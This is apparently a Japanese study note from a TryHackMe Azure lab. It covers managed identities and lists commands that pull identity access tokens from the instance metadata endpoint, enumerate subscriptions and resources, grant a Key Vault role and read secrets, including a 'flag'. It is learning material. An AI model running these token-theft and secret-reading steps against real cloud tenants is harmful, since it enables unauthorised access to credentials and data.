# Azure基礎

https://tryhackme.com/room/eyeswideshut

（具体的な攻撃手法が説明されているサイト）  
https://hackingthe.cloud/azure/abusing-managed-identities/

## Managed Identities

### システム割り当て管理ID (System-Assigned Managed Identity)

- 自動的に作成され、特定の Azure リソース (例: Lab Machine、App Service) に関連付けられる。
- リソースが削除されると、そのIDも削除される。
- リソースごとにシステムから割り当てられるIDは1つのみ。

### ユーザー割り当て管理ID (User-Assigned Managed Identity)

- スタンドアロンのAzureリソースとして作成される。
- 1つまたは複数のAzureリソースに割り当てることができる。
- 割り当てられたリソースのライフサイクルとは独立して管理される。

### 主なメリット

- 資格情報の管理は不要。Azureが資格情報のローテーションと保存を処理する。
- セキュリティの向上：機密情報や鍵の漏洩リスクを低減する。
- 簡素化されたアクセス制御： Azure RBACまたはEntra IDを介して権限を付与できる。

## Azure CLI

```sh
# install
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

```sh
# login
az login --identity
```

```sh
# VMのマネージドIDのプリンシパル名を取得
az vm identity show --name LinuxVM --resource-group rg-07304698 --query principalId --output tsv
```

```sh
# マネージドIDに付与されているロール一覧
az role assignment list --assignee d727460b-47c8-48e9-81c0-4256e0984a31 --all -o table
```

## IMDS エンドポイント

```sh
# メタデータ
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json"
```

### アクセストークン

```sh
# マネージドアイデンティティ用のアクセストークン取得。client_id も含まれる。
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

```sh
# 取得したトークンを変数に格納
TOKEN="YOUR_ACCESS_TOKEN_HERE"
```

```sh
# トークンにどんな権限があるか（JWTのデコード）。トークンの2番目のパート（ペイロード）を抽出してデコード。
echo $TOKEN | awk -F. '{print $2}' | base64 -d 2>/dev/null | jq .
```

```sh
# メタデータで表示されたサブスクリプションID
SUBSC=1746294a-5aa8-4cbb-82a4-11e731b20942
```

```sh
# サブスクリプション自体の情報取得
curl -H "Authorization: Bearer $TOKEN"      "https://management.azure.com/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/?api-version=2021-04-01"
```

```sh
# リソースグループ rg-09268716 内のリソース一覧を取得
curl -H "Authorization: Bearer $TOKEN" \
     "https://management.azure.com/subscriptions/$SUBSC/resourceGroups/rg-09268716/resources?api-version=2021-04-01"
```

```sh
# サブスクリプション内の全リソース一覧
curl -H "Authorization: Bearer $TOKEN" \
     "https://management.azure.com/subscriptions/$SUBSC/resources?api-version=2021-04-01"
```

```sh
# ストレージアカウント一覧
curl -H "Authorization: Bearer $TOKEN" \
     "https://management.azure.com/subscriptions/$SUBSC/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01"
```

## key vault

```sh
# 1. Key Vault用のアクセストークンを取得する
TOKEN=$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H "Metadata: true" | jq -r '.access_token')

# 2. Key Vault内のシークレット一覧を取得する
curl -s -H "Authorization: Bearer $TOKEN" \
     "https://akv-09261155.vault.azure.net/secrets?api-version=7.4" | jq .
```

```sh
curl -s -H "Authorization: Bearer $TOKEN" \
     "https://akv-09261155.vault.azure.net/secrets/シークレット名?api-version=7.4" | jq .
```

### マネージドIDにロールを付与する

```sh
# VMのマネージドIDのプリンシパル名を取得
az vm identity show --name LinuxVM --resource-group rg-07304698 --query principalId --output tsv
```

```sh
# マネージドIDに付与されているロール一覧
az role assignment list --assignee d727460b-47c8-48e9-81c0-4256e0984a31 --all -o table
```

```sh
# マネージドIDに対してKeyVaultSecretsUserロールを付与
az role assignment create \
  --assignee "d727460b-47c8-48e9-81c0-4256e0984a31" \
  --role "Key Vault Secrets User" \
  --scope "/subscriptions/1746294a-5aa8-4cbb-82a4-11e731b20942/resourceGroups/rg-09275028/providers/Microsoft.KeyVault/vaults/akv-09275028"
```

```sh
az keyvault secret list --vault-name akv-09275028

az keyvault secret show --vault-name akv-09275028 --name flag
```


## Powershell

```ps
# Azure Powershell モジュールをインストール
Install-Module -Name Az -Repository PSGallery -Force
# アクセストークンでAzureに接続
Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
```

```ps
# サブスクリプション内のAzureリソースを取得
Get-AzResource
```

```ps
# KeyVault の詳細（name, rg はGet-AzResource の結果から）
Get-AzKeyVault -Name akv-09275028 -ResourceGroupName rg-09275028
```

```ps
# 割り当てられたロールの一覧
Get-AzRoleAssignment
```



